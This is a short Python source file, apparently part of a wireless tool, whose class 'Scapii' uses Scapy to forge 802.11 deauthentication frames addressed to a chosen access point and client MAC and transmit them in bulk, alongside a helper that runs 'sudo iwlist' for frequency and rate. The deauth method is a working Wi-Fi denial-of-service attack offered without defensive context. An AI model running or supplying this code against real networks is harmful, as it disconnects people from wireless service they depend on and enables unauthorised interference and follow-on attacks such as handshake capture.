import subprocess
from scapy.all import (
    RadioTap,
    Dot11,
    Dot11Deauth,
    sendp
)
from subprocess import *

import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
from scapy.all import * 


class Scapii:
    def __init__(self, master):
        self.master = master
    
    def deauth(self, iface: str, count: int, bssid: str, target_mac: str):
        dot11 = Dot11(addr1=bssid, addr2=target_mac, addr3=bssid)
        frame = RadioTap()/dot11/Dot11Deauth()
        sendp(frame, iface=iface, count=count, inter=0.100)
    
    def cmdLine(self, iface):
        # print(call(["sudo", "iwlist", "wlo1", "frequency"]))
        resp1 = subprocess.run(["sudo", "iwlist", iface, "frequency"], capture_output=True)
        resp2 = subprocess.run(["sudo", "iwlist", iface, "rate"], capture_output=True)
        return (resp1.stdout, resp2.stdout)
        
                    
        